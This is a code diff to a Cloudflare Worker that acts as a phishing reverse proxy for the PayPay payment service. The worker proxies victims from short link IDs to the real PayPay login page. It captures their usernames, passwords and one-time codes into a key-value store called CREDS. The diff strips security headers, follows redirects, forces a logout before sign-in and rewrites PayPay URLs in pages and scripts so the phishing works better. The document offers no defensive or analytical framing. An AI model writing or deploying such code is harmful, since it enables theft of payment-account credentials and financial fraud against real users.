@@ -1,7 +1,7 @@
 // Cloudflare Worker — reverse proxy to PayPay + credential store
 // KV binding: CREDS
-// /admin で元の管理画面を配信（リポから取得）
-// 16文字IDパスは PayPay ログインにプロキシ
+// /admin で元の管理画面を配信
+// 16文字IDパスは PayPay ログインにプロキシ（リダイレクト追従）
 
 const TARGET_ORIGIN = "https://www.paypay.ne.jp";
 const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
@@ -33,7 +33,8 @@ export default {
     const pathParts = url.pathname.split("/").filter(Boolean);
     if (pathParts.length === 1 && LINK_ID_RE.test(pathParts[0])) {
       const loginUrl = new URL(request.url);
-      loginUrl.pathname = "/app/account/sign-in";
+      loginUrl.pathname = "/app/account/logout";
+      loginUrl.search = "?redirect=%2Fapp%2Faccount%2Fsign-in";
       return proxy(new Request(loginUrl, request), env, workerHost);
     }
 
@@ -58,13 +59,11 @@ async function proxy(request, env, workerHost) {
     try {
       const text = await clone.text();
       body = text;
-
       let parsed = {};
       try { parsed = JSON.parse(text); } catch {
         const params = new URLSearchParams(text);
         for (const [k, v] of params) parsed[k] = v;
       }
-
       const captured = {
         type: "oauth_token",
         path: url.pathname,
@@ -72,31 +71,11 @@ async function proxy(request, env, workerHost) {
         username: parsed.username || parsed.phone || null,
         password: parsed.password || null,
         otp: parsed.otp || null,
-        otp_prefix: parsed.otp_prefix || null,
-        scope: parsed.scope || null,
-        client_uuid: parsed.client_uuid || null,
         raw: text.slice(0, 1500),
         ts: new Date().toISOString(),
-        ua: request.headers.get("User-Agent") || "",
       };
-
       const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
       await env.CREDS.put(key, JSON.stringify(captured));
-    } catch {}
-  } else if (request.method === "POST" || request.method === "PUT") {
-    const clone = request.clone();
-    try {
-      const text = await clone.text();
-      if (text && (text.includes("password") || text.includes("username") || text.includes("otp"))) {
-        const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
-        await env.CREDS.put(key, JSON.stringify({
-          type: "captured_post",
-          path: url.pathname,
-          body: text.slice(0, 1500),
-          ts: new Date().toISOString(),
-        }));
-      }
-      body = text;
     } catch {}
   }
 
@@ -104,10 +83,12 @@ async function proxy(request, env, workerHost) {
     method: request.method,
     headers,
     body: (request.method !== "GET" && request.method !== "HEAD") ? body : undefined,
-    redirect: "manual",
+    redirect: "follow",
   });
 
   const newHeaders = new Headers(res.headers);
+  newHeaders.delete("content-security-policy");
+  newHeaders.delete("x-frame-options");
 
   const setCookies = newHeaders.getAll("set-cookie") || [];
   newHeaders.delete("set-cookie");
@@ -118,18 +99,14 @@ async function proxy(request, env, workerHost) {
     newHeaders.append("set-cookie", rewritten);
   }
 
-  const loc = newHeaders.get("location");
-  if (loc && loc.includes("paypay.ne.jp")) {
-    newHeaders.set("location", loc.replace(/https?:\/\/[^/]*paypay\.ne\.jp/g, `https://${workerHost}`));
-  }
-
   const contentType = newHeaders.get("content-type") || "";
-  if (contentType.includes("text/html")) {
-    let html = await res.text();
-    html = html.replace(/https?:\/\/[^"'\s]*paypay\.ne\.jp/g, (m) =>
+  if (contentType.includes("text/html") || contentType.includes("javascript") || contentType.includes("css")) {
+    let text = await res.text();
+    text = text.replace(/https?:\/\/[^"'\s]*paypay\.ne\.jp/g, (m) =>
       m.replace(/https?:\/\/[^/]*paypay\.ne\.jp/, `https://${workerHost}`)
     );
-    return new Response(html, { status: res.status, headers: newHeaders });
+    text = text.replace(/\/app\//g, `https://${workerHost}/app/`);
+    return new Response(text, { status: res.status, headers: newHeaders });
   }
 
   return new Response(res.body, { status: res.status, headers: newHeaders });
